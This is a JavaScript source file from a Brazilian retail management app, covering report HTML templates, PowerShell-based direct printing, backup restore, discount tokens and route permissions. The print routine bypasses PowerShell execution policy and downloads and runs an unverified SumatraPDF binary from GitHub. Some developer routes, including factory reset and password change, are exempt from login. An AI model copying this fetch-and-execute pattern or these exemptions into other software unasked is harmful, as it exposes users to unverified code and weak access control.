.sit{margin-bottom:7mm}
.sit .rot{font-size:10px;color:#888;margin-bottom:2mm}
.ass{display:grid;grid-template-columns:1fr 1fr;gap:18mm;margin-top:14mm}
.ass-box .linha{border-top:1px solid #bbb;padding-top:2mm;margin-top:16mm;text-align:center}
.ass-box .nome{font-size:11px;font-weight:700;color:#333}
.ass-box .papel{font-size:10px;color:#888}
.ass-box .data{font-size:10px;color:#bbb;margin-top:2mm}
.rodape{border-top:1px solid #ddd;padding-top:3mm;margin-top:8mm;font-size:9px;color:#bbb;text-align:center}
</style>
</head><body>

<div class="cab">
  <div>
    ${logoUri ? `<img class="cab-logo" src="${logoUri}" onerror="this.style.display='none'">` : ''}
    <div class="cab-nome">${esc2(nomeLoja)}</div>
  </div>
  <div class="cab-dir">
    <h1>Prestação de Contas</h1>
    <div class="sub">Produtos Consignados</div>
    <div class="emitido">Emitido em ${emitido}</div>
  </div>
</div>

<div class="bloco-forn">
  <div class="rot">Fornecedor</div>
  <div class="nome">${esc2(fornecedor)}</div>
  <div class="per">Apuração: <b>${esc2(periodoTexto)}</b></div>
</div>

<h2>Produtos vendidos no período</h2>
<table>
  <thead><tr>
    <th>Produto / Variação</th>
    <th class="num">Qtd</th>
    <th class="num">Vl. tabela</th>
    <th class="num">Desconto</th>
    <th class="num">Recebido</th>
    <th class="num">Custo</th>
    <th class="num">% acerto</th>
    <th class="num">+ Fatia lucro</th>
    <th class="num">= Repasse</th>
  </tr></thead>
  <tbody>
    ${linhasItens}
    <tr class="tr-total">
      <td><b>TOTAL</b></td>
      <td class="num"><b>${totQtd}</b></td>
      <td class="num"><b>${moeda(totVenda)}</b></td>
      <td class="num"><b>${totDesconto > 0.005 ? '−' + moeda(totDesconto) : '—'}</b></td>
      <td class="num"><b>${moeda(totRecebido)}</b></td>
      <td class="num"><b>${moeda(totCusto)}</b></td>
      <td class="num">—</td>
      <td class="num"><b>${moeda(totLucroForn)}</b></td>
      <td class="num"><b>${moeda(totComissao)}</b></td>
    </tr>
  </tbody>
</table>

<h2>Resumo financeiro</h2>
<div class="res">
  <div>
    <div class="res-linha"><span>Peças vendidas</span><b>${totQtd} peça(s)</b></div>
    <div class="res-linha"><span>Valor de tabela</span><b>${moeda(totVenda)}</b></div>
    ${totDesconto > 0.005 ? `<div class="res-linha"><span>Desconto no fechamento</span><b>−${moeda(totDesconto)}</b></div>` : ''}
    <div class="res-linha"><span>Recebido</span><b>${moeda(totRecebido)}</b></div>
    <div class="res-linha"><span>Custo das peças</span><b>${moeda(totCusto)}</b></div>
  </div>
  <div>
    <div class="res-linha"><span>Fatia do lucro (fornecedor)</span><b>${moeda(totLucroForn)}</b></div>
    <div class="res-linha dest"><span>TOTAL A REPASSAR</span><b>${moeda(totComissao)}</b></div>
    <div class="res-linha suave"><span>Sobra para a loja</span><b>${moeda(totLoja)}</b></div>
  </div>
</div>

<div class="obs">
  📌 <b>Como calculamos o repasse:</b> o fornecedor recebe o <b>custo das peças</b> de volta
  mais a <b>fatia do lucro</b> combinada (valor de venda − custo × percentual acordado).
  O repasse <u>não</u> é uma porcentagem direta do preço de venda — por isso costuma ser maior
  do que o percentual sugere.
</div>

<div class="sit">
  <div class="rot">Situação neste período:</div>
  ${statusBadge}
</div>

<div class="ass">
  <div class="ass-box">
    <div class="linha">
      <div class="nome">${esc2(nomeLoja)}</div>
      <div class="papel">Responsável</div>
      <div class="data">Data de acerto: ___ / ___ / ______</div>
    </div>
  </div>
  <div class="ass-box">
    <div class="linha">
      <div class="nome">${esc2(fornecedor)}</div>
      <div class="papel">Fornecedor / Representante</div>
      <div class="data">Data de acerto: ___ / ___ / ______</div>
    </div>
  </div>
</div>

<div class="rodape">${esc2(nomeLoja)} · Salgueiro Gestão · Documento gerado automaticamente em ${emitido}</div>
</body></html>`;
}

// HTML standalone para relatório resumido de transferências (paisagem A4)
function gerarHtmlRelatorioTransferencias(transferencias, cfg, p) {
  const esc2 = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const loja = esc2(cfg && cfg.loja_nome ? cfg.loja_nome : 'Salgueiro Gestão');
  const dataBr = s => String(s||'').slice(0,10).split('-').reverse().join('/');
  const dataBrH = s => `${dataBr(s)} ${String(s||'').slice(11,16)}`;
  const agora = new Date().toLocaleString('pt-BR');
  let lista = transferencias;
  if (p.de)  lista = lista.filter(t => t.criado_em >= p.de);
  if (p.ate) lista = lista.filter(t => t.criado_em <= p.ate + ' 23:59:59');
  const totalPecas = lista.reduce((s, t) => s + (Number(t.pecas)||0), 0);
  const filtroTxt = (p.de || p.ate)
    ? `Período: ${p.de ? dataBr(p.de) : '—'} a ${p.ate ? dataBr(p.ate) : '—'}`
    : 'Todos os registros';
  const linhas = lista.map(t => `<tr>
    <td class="num">#${t.id}</td>
    <td>${dataBrH(t.criado_em)}</td>
    <td>${esc2(t.origem)}</td>
    <td>${esc2(t.destino)}</td>
    <td>${esc2(t.usuario||'—')}</td>
    <td class="num">${t.pecas}</td>
    <td>${esc2(t.obs||'—')}</td>
  </tr>`).join('');
  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
  <style>
    @page{size:A4 landscape;margin:14mm 12mm}
    *{box-sizing:border-box;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif}
    body{font-size:10.5px;color:#111}
    h1{font-size:17px;font-weight:800;margin-bottom:2px}
    .sub{font-size:10px;color:#555;padding-bottom:8px;border-bottom:2px solid #222;margin-bottom:10px}
    table{width:100%;border-collapse:collapse}
    th{font-size:9.5px;text-transform:uppercase;letter-spacing:.5px;
      background:#f0f0f0;padding:4px 6px;border:1px solid #bbb;text-align:left}
    td{border:1px solid #ddd;padding:4px 6px}
    tr:nth-child(even) td{background:#fafafa}
    .num{text-align:right}
    .tot td{font-weight:700;background:#f0f0f0;border-color:#aaa}
    .rodape{margin-top:12px;font-size:9px;color:#888;text-align:right}
  </style></head><body>
  <h1>${loja} — Relatório de Transferências</h1>
  <div class="sub">${filtroTxt} · ${lista.length} romaneio(s) · Total: ${totalPecas} peça(s) · Gerado em ${agora}</div>
  <table><thead><tr>
    <th class="num">Nº</th><th>Data</th><th>De</th><th>Para</th>
    <th>Responsável</th><th class="num">Peças</th><th>Observação</th>
  </tr></thead><tbody>
    ${linhas || '<tr><td colspan="7" style="text-align:center;padding:16px;color:#888">Nenhuma transferência no período.</td></tr>'}
    <tr class="tot"><td colspan="5">TOTAL</td><td class="num">${totalPecas}</td><td></td></tr>
  </tbody></table>
  <div class="rodape">Salgueiro Gestão · ${loja}</div>
  </body></html>`;
}

// ── Impressão local direta (sem extensão PS1) ─────────────────────────────────
// Grava um PS1 temporário e executa via powershell.exe.
// Vantagem: funciona mesmo sem a extensão de rede; envia para a impressora
// configurada (não para o padrão do Windows).
async function _imprimirDireto(conteudo, impressora, tipo) {
  try {
    // NL_PATH = diretório de instalação (onde resources.neu está)
    // NL_CWD  = diretório de trabalho do processo (pode ser home do usuário)
    const appDir = (typeof NL_PATH !== 'undefined' ? NL_PATH : (typeof NL_CWD !== 'undefined' ? NL_CWD : '')).replace(/\\/g, '/');
    if (!appDir) return { ok: false, erro: 'NL_PATH indisponivel' };

    // Temp files ficam em %TEMP% para garantir acesso de escrita
    const tmpDir = appDir + '/tmp-print';
    try { await Neutralino.filesystem.createDirectory(tmpDir); } catch { /* ja existe */ }

    const id = Date.now();
    const htmlPath = `${tmpDir}/print-${id}.html`;
    const ps1Path  = `${tmpDir}/print-${id}.ps1`;

    await Neutralino.filesystem.writeFile(htmlPath, conteudo);

    const htmlW    = htmlPath.replace(/\//g, '\\');
    const pdfW     = htmlW.replace(/\.html$/, '.pdf');
    const sumatraW = (appDir + '/extensions/rede/SumatraPDF.exe').replace(/\//g, '\\');
    const esc      = s => s.replace(/'/g, "''");  // escape PS1 single-quote
    const dimsLine = tipo === 'etiqueta'
      ? `$dims = @('--paper-width=2.362','--paper-height=1.575')`
      : `$dims = @('--paper-width=3.150')`;

    // PS1 usa & + splatting para passar argumentos com espaços corretamente
    // (Start-Process -ArgumentList @array não escapa espaços — bug conhecido do PS1)
    // Edge: polling pelo PDF em vez de -Wait (processo pai sai antes de gravar o arquivo)
    const dimArgs = tipo === 'etiqueta'
      ? `'--paper-width=2.362', '--paper-height=1.575'`
      : `'--paper-width=3.150'`;

    const linhas = [
      `$h = '${esc(htmlW)}'`,
      `$p = '${esc(pdfW)}'`,
      `$imp = '${esc(impressora)}'`,
      `$s = '${esc(sumatraW)}'`,
      `if (!(Test-Path $s)) { $s = "$env:LOCALAPPDATA\\SalgueiroGestao\\extensions\\rede\\SumatraPDF.exe" }`,
      // Se ainda não existe, baixa do GitHub automaticamente
      `if (!(Test-Path $s)) {`,
      `  Write-Host "SUMATRA_BAIXANDO"`,
      `  $dir = Split-Path $s -Parent`,
      `  New-Item -ItemType Directory -Force -Path $dir | Out-Null`,
      `  $tmpZip = "$env:TEMP\\sp361.zip"`,
      `  & curl.exe -fsSL -o $tmpZip "https://github.com/sumatrapdfreader/sumatrapdf/releases/download/SumatraPDF_rel-3.6.1/SumatraPDF-3.6.1-64.zip"`,
      `  if ((Test-Path $tmpZip) -and (Get-Item $tmpZip).Length -gt 500000) {`,
      `    Add-Type -AssemblyName System.IO.Compression.FileSystem`,
      `    $z = [IO.Compression.ZipFile]::OpenRead($tmpZip)`,
      `    foreach ($entry in $z.Entries) { if ($entry.Name -like '*.exe') { [IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $s, $true); break } }`,
      `    $z.Dispose(); Remove-Item $tmpZip -EA 0`,
      `  }`,
      `  Write-Host "SUMATRA_DL:$(Test-Path $s)"`,
      `}`,
      `Write-Host "IMP:[$imp]"`,
      `Write-Host "SUMATRA:$(Test-Path $s)"`,
      `$e = @('C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe','C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe') | Where-Object { Test-Path $_ } | Select-Object -First 1`,
      `Write-Host "EDGE:$e"`,
      `if (!$e) { Write-Host 'EDGE_NAO_ENCONTRADO'; exit 1 }`,
      `$u = 'file:///' + $h.Replace('\\','/')`,
      `$eA = @('--headless=new','--no-sandbox','--run-all-compositor-stages-before-draw','--print-to-pdf-no-margins',${dimArgs},"--print-to-pdf=$p",'--print-to-pdf-no-header',$u)`,
      `Write-Host "EDGE_START"`,
      `& $e @eA`,
      `Write-Host "EDGE_DONE"`,
      `$dl = (Get-Date).AddSeconds(20)`,
      `while (!(Test-Path $p) -and (Get-Date) -lt $dl) { Start-Sleep -Milliseconds 300 }`,
      `Write-Host "PDF_EXISTS:$(Test-Path $p)"`,
      `if (Test-Path $p) { Write-Host "PDF_SIZE:$((Get-Item $p).Length)" }`,
      `if (!(Test-Path $p) -or (Get-Item $p).Length -lt 200) { Remove-Item $h -EA 0; exit 2 }`,
      `Write-Host "PDF_PATH:$p"`,
      `Write-Host "IMP_LEN:$($imp.Length)"`,
      `$sOut = & $s $p '-print-to' $imp '-print-settings' '${tipo === 'etiqueta' ? 'noscale,landscape' : 'noscale'}' '-exit-when-done' 2>&1 | Out-String`,
      `$sc = $LASTEXITCODE`,
      `Write-Host "SUMATRA_EXIT:$sc"`,
      `Write-Host "SUMATRA_OUT:$sOut"`,
      `Remove-Item $h,$p -EA 0`,
      `exit $sc`,
    ];
    const ps1 = linhas.join('\r\n');

    await Neutralino.filesystem.writeFile(ps1Path, ps1);

    const ps1W = ps1Path.replace(/\//g, '\\');
    const r = await Neutralino.os.execCommand(
      `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${ps1W}"`
    );

    try { await Neutralino.filesystem.remove(ps1Path); } catch { /* ok */ }

    const dbg = (r.stdOut || '') + (r.stdErr ? '\nSTDERR:' + r.stdErr : '');
    console.log('[imprimir-debug]', dbg);
    if (r.exitCode !== 0) {
      return { ok: false, erro: `Codigo ${r.exitCode}`, debug: dbg };
    }
    return { ok: true, debug: dbg };
  } catch (e) {
    console.error('[imprimirDireto]', e);
    return { ok: false, erro: String(e) };
  }
}

// Restauração de backup — caminho único para as duas rotas (seletor e lista).
// Regras de segurança:
//  1. o arquivo precisa ser um banco íntegro do Salgueiro (todas as tabelas);
//  2. se o backup tem MENOS dados que o banco atual, só prossegue com
//     `confirmado: true` — a tela pergunta antes, com os números na tela;
//  3. o banco atual vira `pre-restauracao-*.db` antes de qualquer escrita;
//  4. reinicia sozinho no fim (o banco é carregado uma vez, no boot).
async function _restaurarBytes(bytes, opcoes) {
  const { confirmado = false } = opcoes || {};

  if (!(await validarBackup(bytes))) {
    return { ok: false, erro: 'Arquivo inválido: não é um backup íntegro do Salgueiro Gestão.' };
  }
  const novo = await radiografar(bytes);
  const atual = await radiografar(db.exportar());

  if (!confirmado && novo.totalDados < atual.totalDados) {
    return {
      ok: false, precisaConfirmar: true, novo, atual,
      erro: `Este backup tem MENOS dados que o sistema atual `
          + `(${novo.vendas} vendas contra ${atual.vendas}). Restaurar vai apagar a diferença.`
    };
  }

  const hora = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  await db.salvarAgora();
  await ambiente.copiarBancoPara(`${await ambiente.dirDados()}/pre-restauracao-${hora}.db`, db.exportar());
  await ambiente.salvarBanco(bytes);
  await ambiente.reiniciarApp(); // restauração só vale depois do boot
  return { ok: true, novo };
}

function exigirLogin(canal) {
  return !['app:versao', 'auth:login', 'auth:sessao', 'config:obter',
           'licenca:status', 'licenca:renovar',
           'dev:entrar', 'dev:aplicar', 'dev:remover',
           'dev:trocarSenha', 'dev:setores', 'dev:resetarFabrica'].includes(canal);
}

// ── Tokens de autorização de desconto (v3.10.0) ─────────────────────────────
// Vivem só na memória do processo: se o sistema for reiniciado no meio de uma
// venda, o operador pede a autorização de novo — que é o comportamento seguro.
// Uso único e validade de 5 minutos, tempo de chamar o administrador ao balcão
// sem deixar uma autorização "pendurada" para a venda seguinte.
const _tokensDesconto = new Map();
const TOKEN_DESCONTO_MS = 5 * 60 * 1000;

function _novoTokenDesconto(autorizadoPor, usuarioId) {
  const token = 'D' + Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
  _tokensDesconto.set(token, { expira: Date.now() + TOKEN_DESCONTO_MS, autorizado_por: autorizadoPor, usuario_id: usuarioId });
  // limpeza preguiçosa dos vencidos — a lista nunca passa de alguns itens
  for (const [k, v] of _tokensDesconto) if (v.expira < Date.now()) _tokensDesconto.delete(k);
  return token;
}

// Consome o token: devolve os dados na primeira vez, null da segunda em diante.
function _consumirTokenDesconto(token) {
  const t = _tokensDesconto.get(String(token || ''));
  if (!t) return null;
  _tokensDesconto.delete(token);
  if (t.expira < Date.now()) return null;
  return t;
}

// Rotas EXCLUSIVAS do administrador — ter a permissão não basta.
// Decisão do Marcio (13/08/2026): mudar número de estoque e ver quem está
// conectado é do dono da loja, não do operador. A permissão `estoque.movimentar`
// continua existindo e ainda vale para o perfil Estoquista VER as telas; o que
// ela deixou de liberar é a escrita.
//
// ATENÇÃO ao que NÃO está aqui: venda, devolução, troca e recebimento de compra
// continuam baixando/subindo estoque normalmente — eles passam pelo core direto
// (pdv.registrarVenda → estoques.aplicar), não por estas rotas. Incluí-las aqui
// travaria o caixa.
const ROTAS_SO_ADMIN = new Set([
  'estoque:movimentar',      // entrada, saída manual e ajuste de inventário
  'estoques:salvar',         // criar/editar local de estoque
  'estoques:desativar',      // desativar local
  'estoques:transferir',     // transferência entre locais (romaneio)
  'mensagens:terminais'      // "Quem está online agora"
]);

// Executor único de rotas — idêntico à V1 (menos o troca-troca de sessão,
// que só existia por causa dos terminais em rede; aqui a sessão é única).
async function processar(canal, payload, sess) {
  try {
    const rota = rotas[canal];
    if (!rota) return { ok: false, erro: `Rota desconhecida: ${canal}` };
    if (exigirLogin(canal) && !sess.usuario) {
      return { ok: false, erro: 'Sessão expirada. Entre novamente.' };
    }
    const bloqueio = licenca.verificar(canal);
    if (bloqueio) return { ok: false, erro: bloqueio };
    // Trava de administrador — vem ANTES da permissão comum, senão o admin
    // seria o único a passar pelos dois testes e a mensagem de erro sairia
    // errada para quem tem a permissão mas não é admin.
    if (ROTAS_SO_ADMIN.has(canal) && (!sess.usuario || sess.usuario.perfil !== 'admin')) {
      return { ok: false, erro: 'Apenas o administrador pode fazer isto.' };
    }
    const permNec = PERM_ROTA[canal];
    if (permNec && !permissoes.pode(sess.usuario, permNec)) {
      return { ok: false, erro: 'Você não tem permissão para esta ação.' };
    }
    // desconto no PDV é uma permissão à parte (validada no conteúdo da venda)
    if (canal === 'pdv:venda' && !permissoes.pode(sess.usuario, 'pdv.desconto')) {
      const p = payload || {};
      const temDesc = (Number(p.desconto) || 0) > 0 ||
        (Array.isArray(p.itens) && p.itens.some(i => (Number(i.desconto) || 0) > 0));
      if (temDesc) return { ok: false, erro: 'Você não tem permissão para dar desconto.' };
    }
    // Desconto MANUAL exige autorização de administrador (v3.10.0).
    //
    // O que é livre: o desconto da categoria do cliente e o automático à vista.
    // Os dois são recalculados aqui a partir do banco e da configuração — o
    // payload não é consultado para isso, senão bastaria mentir a origem.
    // Só o que EXCEDE esse valor precisa do token emitido em auth:autorizarDesconto.
    // Venda a custo NÃO passa por aqui: ela tem trava própria logo abaixo e o
    // core já zera o desconto. Sem esta guarda, um payload a custo que chegasse
    // com desconto consumiria o token de uso único aqui e a trava de custo
    // ficaria sem token para validar.
    if (canal === 'pdv:venda' && String((payload || {}).tipo_venda || '') !== 'custo') {
      const p = payload || {};
      const desc = Number(p.desconto) || 0;
      if (desc > 0) {
        const sub = (Array.isArray(p.itens) ? p.itens : []).reduce(
          (s, i) => s + (Number(i.qtd) || 0) * (Number(i.preco_unit) || 0) - (Number(i.desconto) || 0), 0);
        const livre = auth.descontoLivre(db, {
          cliente_id: p.cliente_id, subtotal: sub,
          pagamentos: p.pagamentos, config: config.obter(db).config
        });
        if (desc > livre + 0.01) {
          const t = _consumirTokenDesconto(p.desconto_token);
          if (!t) {
            return { ok: false, erro: 'Desconto acima do automático precisa de autorização do administrador. Peça a autorização e refaça o fechamento.' };
          }
          // Quem autorizou vem do token (do banco), nunca do campo enviado.
          p.desconto_autorizado_por = t.autorizado_por;
        }
      }
    }
    // Venda a PREÇO DE CUSTO exige autorização de administrador (v3.19.0).
    //
    // Mesma trava do desconto manual: token de uso único emitido em
    // auth:autorizarDesconto e consumido aqui. Sem ele a venda é recusada —
    // a checagem não pode viver só na tela, senão um terminal em rede monta
    // o payload à mão e vende tudo a custo.
    //
    // O motivo é obrigatório: é o único rastro de por que a loja abriu mão da
    // margem. Quem autorizou vem do TOKEN (lido do banco), nunca do formulário.
    if (canal === 'pdv:venda' && String((payload || {}).tipo_venda || '') === 'custo') {
      const p = payload;
      const t = _consumirTokenDesconto(p.desconto_token);
      if (!t) {
        return { ok: false, erro: 'Venda a preço de custo precisa de autorização do administrador. Peça a autorização e refaça o fechamento.' };
      }
      if (!String(p.desconto_motivo || '').trim()) {
        return { ok: false, erro: 'Informe o motivo da venda a preço de custo.' };
      }
      p.desconto_autorizado_por = t.autorizado_por;
    }

    // Setores desligados pelo Dev que aparecem como forma de pagamento no PDV
    if (canal === 'pdv:venda') {
      const formas = Array.isArray((payload || {}).pagamentos) ? payload.pagamentos.map(pg => pg.forma) : [];
      if (formas.includes('crediario') && licenca.setorBloqueado('crediario')) {
        return { ok: false, erro: 'O crediário está desativado nesta instalação.' };
      }
      if (formas.includes('vale') && licenca.setorBloqueado('vales')) {
        return { ok: false, erro: 'Os vales-troca estão desativados nesta instalação.' };
      }
    }
    // Isolamento de sessão multiterminal: as rotas fecham sobre `sessao.usuario` (módulo),
    // mas chamadas vindas de terminais em rede chegam com `sess` diferente de `sessao`.
    // Sem este ajuste, qualquer terminal veria o painel do usuário logado localmente (admin).
    // As rotas SQL são síncronas → não há race condition neste override temporário.
    const _salvoUsuario = sessao.usuario;
    if (sess !== sessao) sessao.usuario = sess.usuario;
    try { return await rota(payload || {}); }
    finally { if (sess !== sessao) sessao.usuario = _salvoUsuario; }
  } catch (e) {
    console.error(`[api] ${canal}:`, e);
    return { ok: false, erro: e.message || 'Erro interno.' };
  }
}

// Permissão exigida por rota (defesa no backend; o admin sempre passa).
const PERM_ROTA = {
  'dashboard:resumo': 'dashboard.ver',
  'produtos:listar': 'produtos.ver', 'produtos:obter': 'produtos.ver',
  'produtos:salvar': 'produtos.editar', 'produtos:excluir': 'produtos.excluir',
  'categorias:listar': 'produtos.ver', 'categorias:salvar': 'produtos.editar', 'categorias:excluir': 'produtos.editar',
  'estoque:buscar': 'estoque.ver', 'estoque:kardex': 'estoque.ver', 'estoque:reposicao': 'estoque.ver',
  'estoque:listarCompleto': 'estoque.ver', 'estoque:exportarXlsx': 'estoque.ver',
  'estoque:exportarXlsxFiltrado': 'produtos.ver',
  'config:definirIcone': 'config.gerenciar', 'config:removerIcone': 'config.gerenciar',
  'pdv:trocarLoja': 'pdv.vender',
  'estoque:movimentar': 'estoque.movimentar',
  'fornecedores:listar': 'compras.ver', 'compras:listar': 'compras.ver', 'compras:obter': 'compras.ver',
  'fornecedores:salvar': 'compras.gerenciar', 'fornecedores:excluir': 'compras.gerenciar',
  'compras:criar': 'compras.gerenciar', 'compras:receber': 'compras.gerenciar', 'compras:cancelar': 'compras.gerenciar',
  'clientes:listar': 'clientes.ver', 'clientes:obter': 'clientes.ver',
  'clientes:listarCategorias': 'clientes.ver', 'clientes:exportar': 'clientes.ver', 'clientes:exportarDados': 'clientes.ver',
  'clientes:salvarCategoria': 'clientes.gerenciar', 'clientes:excluirCategoria': 'clientes.gerenciar',
  'clientes:importar': 'clientes.gerenciar',
  'clientes:salvar': 'clientes.gerenciar', 'clientes:excluir': 'clientes.gerenciar',
  'crediario:abertas': 'clientes.ver', 'crediario:aniversariantes': 'clientes.ver',
  'clientes:aniversariantes': 'clientes.ver',
  'crediario:receber': 'crediario.receber',
  'financeiro:listar': 'financeiro.ver', 'financeiro:fluxo': 'financeiro.ver',
  'financeiro:salvar': 'financeiro.gerenciar', 'financeiro:baixar': 'financeiro.gerenciar', 'financeiro:excluir': 'financeiro.gerenciar',
  'consignacao:resumo': 'financeiro.ver', 'consignacao:listar': 'financeiro.ver',
  'consignacao:acertar': 'financeiro.gerenciar',
  'relatorios:vendas': 'relatorios.ver', 'relatorios:abc': 'relatorios.ver', 'relatorios:paradas': 'relatorios.ver',
  // relatório de estoque: quem cuida do estoque precisa dele, mesmo sem acesso a relatórios de venda
  'relatorios:estoque': 'estoque.ver',
  'relatorios:consignados': 'relatorios.ver',
  'catalogo:categorias': 'produtos.ver', 'catalogo:gerar': 'produtos.ver',
  'relatorios:listarVendasFornecedor': 'relatorios.ver',
  'relatorios:reciboConsignado': 'relatorios.ver',
  'relatorios:evento': 'relatorios.ver', 'relatorios:eventoXlsx': 'relatorios.ver',
  'relatorios:acompanhadas': 'relatorios.ver', 'relatorios:acompanhadasXlsx': 'relatorios.ver',
  'relatorios:ranking': 'relatorios.ver', 'relatorios:rankingXlsx': 'relatorios.ver',
  'relatorios:eventos': 'relatorios.ver', 'relatorios:rankingPeriodo': 'relatorios.ver',
  'relatorios:rankingPeriodoXlsx': 'relatorios.ver',
  'relatorios:receitaPorLoja': 'dashboard.financeiro',
  'lojas:listar': 'pdv.ver', 'lojas:salvar': 'config.gerenciar', 'lojas:excluir': 'config.gerenciar',
  'estoques:listar': 'estoque.ver', 'estoques:conteudo': 'estoque.ver',
  'estoques:porVariacao': 'estoque.ver',
  'estoques:mapaLocais': 'estoque.ver',
  'estoques:variacoesNoLocal': 'estoque.ver', 'estoques:transferencias': 'estoque.ver',
  'estoques:romaneio': 'estoque.ver', 'estoques:conteudoXlsx': 'estoque.ver',
  'estoques:romaneio-pdf': 'estoque.ver', 'estoques:relatorio-transferencias-pdf': 'estoque.ver',
  'estoques:salvar': 'estoque.movimentar', 'estoques:desativar': 'estoque.movimentar',
  'estoques:transferir': 'estoque.movimentar', 'estoques:transferirTudo': 'estoque.movimentar',
  'pdv:caixaAtual': 'pdv.ver', 'pdv:resumoCaixa': 'pdv.ver', 'pdv:listarVendas': 'pdv.ver', 'pdv:listarVendasGeral': 'pdv.ver', 'pdv:obterVenda': 'pdv.ver',
  'pdv:venda': 'pdv.vender',
  'pdv:abrirCaixa': 'caixa.abrir_fechar', 'pdv:fecharCaixa': 'caixa.abrir_fechar',
  'pdv:movimentoCaixa': 'caixa.sangria',
  'pdv:cancelarVenda': 'pdv.cancelar',
  'devolucoes:itensVenda': 'pdv.devolucao', 'devolucoes:registrar': 'pdv.devolucao', 'devolucoes:listar': 'pdv.devolucao',
  // Troca liberada para todo mundo que opera o PDV (decisão do Marcio, v3.2.0):
  // gerente e vendedores precisam resolver a troca na hora, sem chamar o admin.
  'trocas:registrar': 'pdv.ver', 'trocas:registrarRapida': 'pdv.ver',
  'vendas:importarAnalisar': 'pdv.vender', 'vendas:importarConfirmar': 'pdv.vender',
  'vales_troca:consultar': 'vales.ver', 'vales_troca:listar': 'vales.ver',
  'pontos:config': 'pdv.ver', 'pontos:saldo': 'pdv.ver', 'pontos:historico': 'clientes.ver',
  'pontos:salvarConfig': 'config.gerenciar', 'pontos:ajustar': 'config.gerenciar',
  'nuvem:status': 'config.gerenciar', 'nuvem:conectar': 'config.gerenciar',
  'nuvem:desconectar': 'config.gerenciar', 'nuvem:backup': 'config.gerenciar',
  'nuvem:salvarClientId': 'config.gerenciar',
  'updater:verificar': 'config.gerenciar',
  'config:salvar': 'config.gerenciar',
  'backup:manual': 'config.gerenciar', 'backup:restaurar': 'config.gerenciar',
  'backup:listarLocais': 'config.gerenciar', 'backup:restaurarLocal': 'config.gerenciar',
  'backup:preAtualizacao': 'config.gerenciar', 'backup:salvarAgora': 'config.gerenciar',
  'rede:status': 'config.gerenciar', 'rede:aplicar': 'config.gerenciar',
  'rede:abrirNavegador': 'config.gerenciar',
  'auth:listarUsuarios': 'usuarios.gerenciar', 'auth:salvarUsuario': 'usuarios.gerenciar',
  'permissoes:catalogo': 'usuarios.gerenciar',
  'mensagens:contatos': 'mensagens.usar', 'mensagens:historico': 'mensagens.usar',
  'mensagens:enviar': 'mensagens.usar', 'mensagens:marcarLido': 'mensagens.usar',
  'avisos:enviar': 'mensagens.avisar', 'avisos:encerrar': 'mensagens.avisar'
};

// ── Inicialização ─────────────────────────────────────────────────────────────
let _pronto = null;

async function _iniciar() {
  await licenca.iniciar();
  let bytesExistentes = await ambiente.lerBanco();
  // Adota o banco inicial APENAS na verdadeira primeira execução:
  // se instalacao.json já existe na pasta de dados, esta máquina já foi
  // inicializada (mesmo que o banco esteja vazio por reset de fábrica ou
  // que o usuário tenha feito um reset e depois atualizado o app).
  // NUNCA sobrescrever dados existentes com o banco bundled.
  const _jaInicializado = !!(await ambiente.lerTextoDados('instalacao.json'));
  if (!_jaInicializado && await estaVazio(bytesExistentes)) {
    try {
      const resp = await fetch('dados-iniciais.db');
      if (resp.ok) {
        const buf = new Uint8Array(await resp.arrayBuffer());
        if (buf.length && await validarBackup(buf)) {
          bytesExistentes = buf;
          console.warn('[boot] banco inicial da Boutique adotado nesta instalação');
          // identidade da instalação, licença e setores acompanham o banco
          for (const nome of ['instalacao', 'licenca', 'setores']) {
            try {
              const rj = await fetch(`dados-iniciais-${nome}.json`);
              if (rj.ok) {
                const txt = await rj.text();
                if (txt.trim()) await ambiente.escreverTextoDados(`${nome}.json`, txt);
              }
            } catch { /* segue sem este arquivo */ }
          }
          await licenca.iniciar(); // recarrega com os arquivos adotados
        }
      }
    } catch (e) { console.error('[boot] dados iniciais indisponíveis:', e); }
  }
  // ── Rede de segurança do boot (v2.9.0) ────────────────────────────────────
  // Se o banco em disco veio quebrado (tabela essencial ausente) ou vazio
  // tendo backup com dados, o app NÃO abre zerado: volta sozinho para a
  // cópia boa mais recente. O banco ruim é preservado para perícia.
  const _radAtual = bytesExistentes ? await radiografar(bytesExistentes)
                                    : { tabelasOk: false, temDados: false, totalDados: 0 };
  if (bytesExistentes && (!_radAtual.tabelasOk || !_radAtual.temDados)) {
    try {
      const { backups } = await ambiente.listarBackupsLocais(); // mais novo primeiro
      for (const b of backups) {
        let cand;
        try { cand = await ambiente.lerBackupLocal(b.nome); } catch { continue; }
        const r = await radiografar(cand);
        if (!r.tabelasOk || !r.temDados) continue;
        const hora = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
        await ambiente.copiarBancoPara(
          `${await ambiente.dirDados()}/banco-com-problema-${hora}.db`, bytesExistentes);
        await ambiente.salvarBanco(cand);
        bytesExistentes = cand;
        RECUPERACAO_BOOT = { backup: b.nome, vendas: r.vendas, produtos: r.produtos };
        console.warn(`[recuperação] banco quebrado — restaurado de ${b.nome}`);
        break;
      }
    } catch (e) { console.error('[recuperação] falhou:', e); }
  }
  if (ambiente.RECUPERADO_DE && !RECUPERACAO_BOOT) {
    RECUPERACAO_BOOT = { backup: `gravação interrompida (${ambiente.RECUPERADO_DE})` };
  }

  // Backup diário: só de banco com dados. Um banco quebrado nunca vira backup
  // (era o que transformava o estrago do dia no "backup do dia").
  if (bytesExistentes && (await radiografar(bytesExistentes)).temDados) {
    await ambiente.salvarBackupDiario(bytesExistentes); // 1 cópia/dia, mantém 30
  }

  db = await criarBanco({
    bytes: bytesExistentes,
    schema: await ambiente.carregarSchema(),
    salvarBytes: ambiente.salvarBanco
  });
  // Logo padrão do cupom: aplica se ainda não configurada (logo_cupom ≠ logo do sistema)
  try {
    const logoRow = db.prepare("SELECT valor FROM config WHERE chave='logo_cupom'").get();
    if (!logoRow || !logoRow.valor) {
      db.prepare("INSERT OR REPLACE INTO config (chave, valor) VALUES ('logo_cupom', ?)").run(LOGO_DEFAULT);
    }
  } catch (e) { console.warn('[logo-default]', e); }

